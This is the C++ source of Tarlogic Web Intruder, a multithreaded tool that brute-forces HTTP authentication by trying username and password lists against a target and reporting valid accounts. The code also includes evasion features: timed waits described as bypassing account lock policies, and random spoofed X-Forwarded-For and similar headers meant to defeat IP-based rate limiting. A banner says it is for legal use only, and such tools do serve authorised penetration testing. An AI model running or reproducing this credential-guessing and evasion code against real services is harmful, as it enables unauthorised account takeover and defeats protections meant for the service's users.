/*
 Copyright (C) 2012  Tarlogic Web intruder (TarWI).
 Andres Tarasco - http://www.tarlogic.com

 All rights reserved.

 Redistribution and use in source and binary forms, with or without
 modification, are permitted provided that the following conditions
 are met:
 1. Redistributions of source code must retain the above copyright
 notice, this list of conditions and the following disclaimer.
 2. Redistributions in binary form must reproduce the above copyright
 notice, this list of conditions and the following disclaimer in the
 documentation and/or other materials provided with the distribution.
 3. All advertising materials mentioning features or use of this software
 must display the following acknowledgement:
 This product includes software developed by Andres Tarasco fhscan
 project and its contributors.
 4. Neither the name of the project nor the names of its contributors
 may be used to endorse or promote products derived from this software
 without specific prior written permission.

 THIS SOFTWARE IS PROVIDED BY THE PROJECT AND CONTRIBUTORS ``AS IS'' AND
 ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 ARE DISCLAIMED.  IN NO EVENT SHALL THE PROJECT OR CONTRIBUTORS BE LIABLE
 FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 SUCH DAMAGE.
 */
#include "../HTTPCore/HTTP.h"
#include "../HTTPCore/ntlm.h"
#include "../HTTPCore/encoders.h"
#include "../HTTPCore/Threading.h"
#include "config.h"
#include "information.h"

// HTTPAPI *api;
PCONFIG config;
class Threading *lock = NULL;
#define PASSWORD_ACCOUNT_NOT_FOUND 0
#define VALID_PASSWORD_ACCOUNT_FOUND 1
#define ALL_PASSWORDS_TESTED 2

int loginIndex = 0; // Index to review the login table.
int passwordIndex = 0; // possition at the Password Table.
int TotalAccountsToTest = 0; // Number of accounts to test
int TestedAccounts = 0;
int ThreadsActivos = 0;
int ThreadId = 0;

#ifdef WIN32
#include <Windows.h>
#else
#include <sys/time.h>
#include <ctime>
#endif

/* Returns the amount of milliseconds elapsed since the UNIX epoch. Works on both
 * windows and linux. 
 Function from http://stackoverflow.com/questions/1861294/how-to-calculate-execution-time-of-a-code-snippet-in-c
 */

uint64 GetTimeMs64() {
#ifdef WIN32
	/* Windows */
	FILETIME ft;
	LARGE_INTEGER li;

	/* Get the amount of 100 nano seconds intervals elapsed since January 1, 1601 (UTC) and copy it
	 * to a LARGE_INTEGER structure. */
	GetSystemTimeAsFileTime(&ft);
	li.LowPart = ft.dwLowDateTime;
	li.HighPart = ft.dwHighDateTime;

	uint64 ret = li.QuadPart;
	ret -= 116444736000000000LL;
	/* Convert from file time to UNIX epoch time. */
	ret /= 10000;
	/* From 100 nano seconds (10^-7) to 1 millisecond (10^-3) intervals */

	return ret;
#else
	/* Linux */
	struct timeval tv;

	gettimeofday(&tv, NULL);

	uint64 ret = tv.tv_usec;
	/* Convert from micro seconds (10^-6) to milliseconds (10^-3) */
	ret /= 1000;

	/* Adds the seconds (10^0) after converting them to milliseconds (10^-3) */
	ret += (tv.tv_sec * 1000);

	return ret;
#endif
}

int GetNextUserNameAndPassword(PCONFIG config, HTTPCHAR *Username,
	HTTPCHAR *Password, int *AccountIndex) {
	lock->LockMutex();
	uint64 current;

	if (passwordIndex == config->credential.nPasswords) {
		lock->UnLockMutex();
		return (0);
	}

	for (int i = loginIndex; i < config->credential.nLogins; i++) {
		if ((config->credential.passwordFound[i] != ALL_PASSWORDS_TESTED) &&
			((config->credential.passwordFound[i] == PASSWORD_ACCOUNT_NOT_FOUND)
			|| (config->StopAfterPasswordFound == 0)))
			// skip users with known passwords
		{
			*AccountIndex = i;
			if (config->Domain[0]) // Establecemos el usuario
			{
				_stprintf(Username, _T("%s\\%s"), config->Domain,
					config->credential.login[i]);
			}
			else {
				_tcscpy(Username, config->credential.login[i]);
			}

			if (config->SingleBruteforceAttack) {
				if (config->credential.nPasswords > i) {
					_tcscpy(Password, config->credential.password[i]);
				}
				else {
					*Password = 0;
				}

				config->credential.passwordFound[i] = ALL_PASSWORDS_TESTED;
				loginIndex++;
				lock->UnLockMutex();
				return (1);
			}

			if (config->WaitTime) // Sacamos fecha actual
			{
				current = GetTimeMs64();
				// Verify if we still need to wait to bypass account lock policy.
				if ((passwordIndex % config->MaxAttempts == 0) &&
					(config->credential.LastUsedTime != 0) &&
					(((current - config->credential.LastUsedTime[i]) / 10000) <
					config->WaitTime)) {
					int wait =
						(config->WaitTime -
						(current - config->credential.LastUsedTime[i]) / 10000);
					while (wait > 0) {
						_tprintf(_T
							("[*] Waiting %6ims (%i/%i login attempts tested)\r"
							), wait, passwordIndex*config->credential.nLogins +
							loginIndex,
							config->credential.nLogins*config->credential.
							nPasswords);
						Sleep(100);
						wait -= 100;
					}
				}
			}
			_tcscpy(Password, config->credential.password[passwordIndex]);
			if (config->WaitTime != 0)
				config->credential.LastUsedTime[i] = GetTimeMs64();
			loginIndex++;
			lock->UnLockMutex();
			return (1);
		}
		else {
			loginIndex++;
		}
	}
	if (config->SingleBruteforceAttack) {
		lock->UnLockMutex();
		return (0);
	}
	loginIndex = 0;
	passwordIndex++;
	if (passwordIndex >= config->credential.nPasswords) {
		lock->UnLockMutex();
		return (0);
	}
	lock->UnLockMutex();
	int ret = GetNextUserNameAndPassword(config, Username, Password,
		AccountIndex);
	return (ret);
}

// --------------------------------------------------------------------------------------

int TestUser(HTTPAPI *api, HTTPHANDLE HTTPHandle, HTTPCHAR *Method,
	HTTPCCHAR *uri, HTTPCSTR username, HTTPCSTR password) {
	_tprintf(_T("[*] Testing account %s / %s                              \r"),
		username, password);
	HTTPSession* data = api->SendHttpRequest(HTTPHandle, Method, uri,
		(HTTPCHAR*)_T(""), username, password);
	if (data) {
		if (data->status != 401) {
			_tprintf(_T("[+] %s:%i %i - Found valid user account: (%s/%s)\r\n"),
				data->hostname, data->port, data->status, username, password);
			delete data;
			return (1);
		}
		delete(data);
	}
	return (0);
}
/******************************************************************************** */

void *BruteForceAttack(void *i) {
	lock->LockMutex();
	int id = ThreadId++;
	lock->UnLockMutex();
	int ret;

	HTTPAPI *api = config->api[id];
	HTTPHANDLE HTTPHandle = config->HTTPHandle[id];
	HTTPCHAR Username[512];
	HTTPCHAR Password[512];
	HTTPCHAR header[4096 * 2] = _T("");
	HTTPCHAR RandomIP[20];

	int AccountIndex;
	while (ret = GetNextUserNameAndPassword(config, Username, Password,
		&AccountIndex)) {
		*header = 0;
		if (config->FakeSourceAddress) {
			_sntprintf(RandomIP, sizeof(RandomIP), _T("%i.%i.%i.%i"),
				rand() % 255, rand() % 255, rand() % 255, rand() % 255);
			_sntprintf(header, sizeof(header),
				_T("HTTP_CLIENT_IP: %s\r\nHTTP_X_FORWARDED_FOR: %s\r\nHTTP_X_FORWARDED: %s\r\nHTTP_FORWARDED_FOR: %s\r\nHTTP_FORWARDED: %s\r\nVIA: %s\r\nHTTP_X_CLUSTER_CLIENT_IP: %s\r\n")
				, RandomIP, RandomIP, RandomIP, RandomIP, RandomIP, RandomIP,
				RandomIP);
		}
		if (config->AdditionalHeaders) {
			_tcscat(header, config->AdditionalHeaders);
		}

		HTTPCHAR ThreadInformation[100];
		_sntprintf(ThreadInformation, sizeof(ThreadInformation),
			"Scanning-Thread-ID: %i\r\n", ThreadId);
		_tcscat(header, ThreadInformation);

		if (*header) {
			api->SetHTTPConfig(HTTPHandle, ConfigAdditionalHeader, header);
		}

		int AuthTest = TestUser(api, HTTPHandle, config->resource->HTTPMethod,
			config->resource->path, Username, Password);
		if (AuthTest) {
			lock->LockMutex();
			if (config->credential.passwordFound[AccountIndex]
				!= ALL_PASSWORDS_TESTED) {
				config->credential.passwordFound[AccountIndex] =
					VALID_PASSWORD_ACCOUNT_FOUND;
			}
			config->credential.totalPasswordsFound += ret;
			lock->UnLockMutex();
		}
	}
	lock->LockMutex();
	ThreadsActivos--;
	lock->UnLockMutex();
#ifndef WIN32
	lock->LockMutex();
	pthread_exit(0);
	lock->UnLockMutex();
#endif
	return(NULL);

}

//-----------------------------------------------------------------------------
 int _tmain(int argc, _TCHAR* argv[])
 {

 _tprintf(_T("Tarlogic Web Intruder v1.0 - for legal purposes only\r\n"));
 _tprintf(_T("(c) 2012 Tarlogic Security - www.tarlogic.com\r\n\r\n"));

 config = LoadConfigurationFiles(argc,argv);
 if (config == NULL){
 return(0);
 }
 lock = new Threading;
 #ifdef WIN32
 HANDLE *thread;
 thread=(HANDLE*)malloc(sizeof(HANDLE)*config->ThreadNumber);
 #else
 pthread_t *e_th;
 e_th=(pthread_t*)malloc(sizeof(pthread_t)*config->ThreadNumber);
 #endif


 if (config->SingleBruteforceAttack) {
 TotalAccountsToTest = config->credential.nLogins;
 _tprintf(_T("[+] Starting Single bruteforce attack: %i users\n"),config->credential.nLogins);
 } else {
 TotalAccountsToTest = config->credential.nLogins * config->credential.nPasswords;
 _tprintf(_T("[+] Starting bruteforce attack: %i combinations\n"),config->credential.nLogins*config->credential.nPasswords);
 }
 _tprintf(_T("[+] Using %i Attack threads\n"),config->ThreadNumber);

 for(unsigned int i=0;i<config->ThreadNumber;i++) {
 #ifdef __WIN32__RELEASE__
 thread[i]=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE) BruteForceAttack, (LPVOID) &i, 0, NULL);
 #else
 pthread_create(&e_th[i], NULL, &BruteForceAttack, (void *)i);
 #endif
 Sleep(50);
 }

 #ifdef __WIN32__RELEASE__
 WaitForMultipleObjects(config->ThreadNumber,thread,TRUE,INFINITE);
 free(thread);
 #else
 for(unsigned int i=0;i<config->ThreadNumber;i++) {
 printf("Esperando : %i\n",i);
 pthread_join(e_th[i], NULL);
 }
 free(e_th);
 #endif

 _tprintf(_T("                                                                                \r\n"));
 _tprintf(_T("[+] Bruteforce finished\n"));
 _tprintf(_T("[+] Status: %i Accounts tested\n"),config->credential.totalPasswordsFound);

 delete config;
 delete lock;
 return 1;

 }
